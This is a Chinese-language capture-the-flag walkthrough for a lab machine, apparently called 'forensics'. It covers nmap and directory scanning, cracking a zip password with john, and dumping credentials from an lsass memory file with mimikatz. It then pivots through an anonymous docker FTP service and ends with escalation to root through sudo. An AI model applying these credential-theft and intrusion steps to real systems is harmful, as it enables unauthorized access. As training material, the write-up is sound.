### 信息收集
```
sudo arp-scan -l     (arp-scan -I ens33 --localnet)
发现新增主机

sudo nmap --min-rate 10000 192.168.1.34 
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 192.168.1.3 -oA 

# Nmap 7.94SVN scan initiated Fri Mar 29 22:28:31 2024 as: nmap --min-rate 10000 -oA nmapscan/ports/forensics 192.168.1.34
Nmap scan report for 192.168.1.34
Host is up (0.00059s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:C9:75:10 (VMware)

# Nmap done at Fri Mar 29 22:28:31 2024 -- 1 IP address (1 host up) scanned in 0.36 seconds

sudo nmap -sT -sV -sC -O -p22,80 192.168.1.34 -oA
sudo nmap --script=vuln -p22,80 192.168.1.34 -oA 
sudo nmap -sU -port-top 20 192.168.1.34 -oA 
并无新发现
 ```

### web渗透
#### 目录扫描
```
目录扫描
┌──(pduck㉿kali)-[~]                                                                                                                                 
└─$ cat Redteam/forensics/dir/dir1                               
/images               (Status: 301) [Size: 313] [--> http://192.168.1.34/images/]                                                 
/style2               (Status: 301) [Size: 313] [--> http://192.168.1.34/style2/]                                                                                     
images:wget -r http://192.168.1.34/ -o Redteam/forensics/
style2: 是个gif图片

详细扫描发现falg.zip 和tips.txt文件
发现tips.txt 里面有个gpg的公私钥
网页破解得到密码
说密码是for加3位数字

  
```
#### 文件信息提取
```
binwalk flag.zip 发现有捆绑
但是解压不知道密码

看看图片有没有啥信息
exiftool 发现
Flag:1 {bc02d4ffbeeab9f57c5e03de1098ff31}
解密:vishva

zip2john flag.zip > a
得到hash值
john a
得到密码for007 验证了前面说到的for+三位数字

解压得到flag.pdf 和lsass.DMP文件

打开pdf查看得到flag2
解密得到shreya，不知道有什么用

```
#### mimikatz
```
lsass.DMP 搜索发现用mimikatz提取信息
键入命令后，将x64文件内容拷贝到windows里
输入sekurlsa::minidump lsass.dmp 和 sekurlsa::logonPasswords full
得到用户密码
jasoos:Password@1
ssh登录


```
### 提权
#### 横向移动
```
搜索可写文件和s位均无有用信息
没有自动任务
sudo -l 没有权限
ip a发现用户有docker  我是根据一般docker ip为172.17.0.1经验
扫描docker 网段
for i in {1..254}; do ping -c 1 -W 1 172.17.0.$i;done
发现.2有回复

nc -vv -z 192.168.200.144 20-120
发现端口21是开的
ftp 匿名尝试登录发现成功，得到saboot.001


scp jasoos@192.168.1.34:/home/saboot.001 /home/Readteam/forencisc/
file 发现我不清楚的东西，交给AI，发现是镜像文件
网上搜索用autopsy

输入网址，按提示，最后得到在文件得到提示
jeenaliisagoodgirl
猜测是另一个用户的密码
```
#### 提权成功
```
sudo -l 发现有all 权限
sudo /bin/bash 提权成功
```